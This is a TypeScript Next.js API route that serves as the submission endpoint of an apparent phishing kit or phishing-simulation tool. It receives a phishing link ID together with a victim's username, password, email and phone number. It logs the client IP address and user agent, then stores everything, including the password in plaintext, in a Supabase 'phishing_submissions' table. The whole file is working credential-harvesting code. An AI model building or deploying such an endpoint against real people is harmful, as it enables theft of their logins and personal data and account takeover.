import { NextResponse } from 'next/server'
import { createClient } from '@/lib/supabase/server'

export async function POST(request: Request) {
  try {
    const supabase = await createClient()
    const body = await request.json()
    const { phishing_link_id, username, password, email, phone } = body

    if (!phishing_link_id) {
      return NextResponse.json({ error: 'Missing phishing_link_id' }, { status: 400 })
    }

    // Get client IP address and user agent
    const headers = request.headers
    const forwardedFor = headers.get('x-forwarded-for')
    const ip_address = forwardedFor ? forwardedFor.split(',')[0].trim() : headers.get('x-real-ip') || 'unknown'
    const user_agent = headers.get('user-agent') || 'unknown'

    // Insert submission
    const { data: submission, error } = await supabase
      .from('phishing_submissions')
      .insert({
        phishing_link_id,
        username,
        password,
        email,
        phone,
        ip_address,
        user_agent,
      })
      .select()
      .single()

    if (error) {
      console.error('Error creating submission:', error)
      return NextResponse.json({ error: 'Failed to create submission' }, { status: 500 })
    }

    return NextResponse.json({ submission, success: true })
  } catch (error) {
    console.error('Error in POST /api/phishing/submit:', error)
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
  }
}

